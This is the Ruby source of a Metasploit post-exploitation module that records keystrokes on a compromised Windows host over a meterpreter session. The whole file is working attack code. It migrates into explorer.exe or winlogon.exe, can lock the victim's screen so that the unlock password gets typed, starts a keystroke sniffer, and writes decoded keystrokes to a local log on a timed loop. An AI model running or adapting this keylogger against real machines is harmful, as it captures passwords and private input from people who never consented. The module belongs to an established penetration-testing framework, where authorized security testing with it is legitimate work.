##
# $Id$
##

##
# ## This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'rex'
require 'msf/core/post/file'
require 'msf/core/post/windows/priv'

class Metasploit3 < Msf::Post

	include Msf::Post::Priv
	include Msf::Post::File

	def initialize(info={})
		super( update_info( info,
				'Name'           => 'Keylog Recorder',
				'Description'    => %q{ Records keyloger data to a log file.},
				'License'        => MSF_LICENSE,
				'Author'         => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>'],
				'Version'        => '$Revision$',
				'Platform'       => [ 'windows' ],
				'SessionTypes'   => [ 'meterpreter', ]

			))
		register_options(
			[
				OptBool.new('LOCKSCREEN',   [false, 'Lock system screen.', false]),
				OptBool.new('MIGRATE',      [false, 'Perform Migration.', false]),
				OptInt.new( 'INTERVAL',     [false, 'Time interval to save keystrokes', 5]),
				OptInt.new( 'PID',          [false, 'Time interval to save keystrokes', nil]),
				OptEnum.new('CAPTURE_TYPE', [false, 'Capture keystrokes for Explorer, Winlogon or PID',
						'explorer', ['explorer','winlogon','pid']])

			], self.class)
		register_advanced_options(
			[
				OptBool.new('ShowKeystrokes',   [false, 'Show captured keystrokes', false])
			], self.class)
	end

	# Run Method for when run command is issued
	def run
		
		print_status("Executing module against #{sysinfo['Computer']}")
		if datastore['MIGRATE']
			case datastore['CAPTURE_TYPE']
			when "explorer"
				process_migrate(datastore['CAPTURE_TYPE'],datastore['LOCKSCREEN'])
			when "winlogon"
				process_migrate(datastore['CAPTURE_TYPE'],datastore['LOCKSCREEN'])
			when "pid"
				if datastore['PID']
					pid_migrate(datastore['PID'])
				else
					print_error("If capture type is pid you must provide one")
					return
				end
			end

		end
		if startkeylogger
			keycap(datastore['INTERVAL'],set_log)
		end
	end

	# Method for creation of log file
	def set_log
		logs = ::File.join(Msf::Config.log_directory,'post','keylog_recorder')
		filenameinfo = sysinfo['Computer'] + "_" + ::Time.now.strftime("%Y%m%d.%M%S")
		# Create the log directory
		::FileUtils.mkdir_p(logs)

		#logfile name
		logfile = logs + ::File::Separator + filenameinfo + ".txt"

		return logfile
	end

	def lock_screen
		print_status("Locking Screen...")
		lock_info = session.railgun.user32.LockWorkStation()
		if lock_info["GetLastError"] == 0
			print_status("Screen has been locked")
		else
			print_error("Screen lock Failed")
		end
	end

	# Method to Migrate in to Explorer process to be able to interact with desktop
	def process_migrate(captype,lock)
		print_status("Migration type #{captype}")
		#begin
		if captype == "explorer"
			process2mig = "explorer.exe"
		elsif captype == "winlogon"
			if is_uac_enabled? and not is_admin?
				print_error("UAC is enabled on this host! Winlogon migration will be blocked.")

			end
			process2mig = "winlogon.exe"
			if lock
				lock_screen
			end
		else
			process2mig = "explorer.exe"
		end
		# Actual migration
		mypid = session.sys.process.getpid
		session.sys.process.get_processes().each do |x|
			if (process2mig.index(x['name'].downcase) and x['pid'] != mypid)
				print_status("\t#{process2mig} Process found, migrating into #{x['pid']}")
				session.core.migrate(x['pid'].to_i)
				print_status("Migration Successful!!")
			end
		end
		return true
	end

	# Method for migrating in to a PID
	def pid_migrate(pid)
		print_status("\tMigrating into #{pid}")
				session.core.migrate(pid)
				print_status("Migration Successful!!")
	end

	# Method for starting the keylogger
	def startkeylogger()
		begin
			#print_status("Grabbing Desktop Keyboard Input...")
			#session.ui.grab_desktop
			print_status("Starting the keystroke sniffer...")
			session.ui.keyscan_start
			return true
		rescue
			print_status("Failed to start Keylogging!")
			return false
		end
	end

	# Method for writing found keystrokes
	def write_keylog_data(logfile)
		data = session.ui.keyscan_dump
		outp = ""
		data.unpack("n*").each do |inp|
			fl = (inp & 0xff00) >> 8
			vk = (inp & 0xff)
			kc = VirtualKeyCodes[vk]

			f_shift = fl & (1<<1)
			f_ctrl  = fl & (1<<2)
			f_alt   = fl & (1<<3)

			if(kc)
				name = ((f_shift != 0 and kc.length > 1) ? kc[1] : kc[0])
				case name
				when /^.$/
					outp << name
				when /shift|click/i
				when 'Space'
					outp << " "
				else
					outp << " <#{name}> "
				end
			else
				outp << " <0x%.2x> " % vk
			end
		end

		sleep(2)
		if not outp.empty?
			print_good("keystrokes captured #{outp}") if datatstore['ShowKeystrokes']
			file_local_write(logfile,"#{outp}\n")
		end
	end

	# Method for Collecting Capture
	def keycap(keytime, logfile)
		begin
			rec = 1
			#Creating DB for captured keystrokes
			print_status("Keystrokes being saved in to #{logfile}")
			#Inserting keystrokes every number of seconds specified
			print_status("Recording ")
			while rec == 1
				#getting and writing Keystrokes
				write_keylog_data(logfile)

				sleep(keytime.to_i)
			end
		rescue::Exception => e
			print_status "Saving last few keystrokes"
			write_keylog_data(logfile)

			print("\n")
			print_status("#{e.class} #{e}")
			print_status("Stopping keystroke sniffer...")
			session.ui.keyscan_stop
		end
	end

end